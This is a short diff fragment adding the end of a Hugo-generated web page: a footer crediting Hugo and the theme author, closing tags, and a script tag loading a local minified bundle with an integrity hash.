+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.4c3fb12a087ceed4a52cb5d57068a9795c7069617a01ca70f788052ad66e1791779e6c72686e1dc0ca13dc03b0203204b6566bb0dd1ee80de2b7ff4d8fe53db2.js" integrity="sha512-TD&#43;xKgh87tSlLLXVcGipeVxwaWF6Acpw94gFKtZuF5F3nmxyaG4dwMoT3AOwIDIEtlZrsN0e6A3it/9Nj&#43;U9sg=="></script>
+
+
+
+    </body>
+</html>
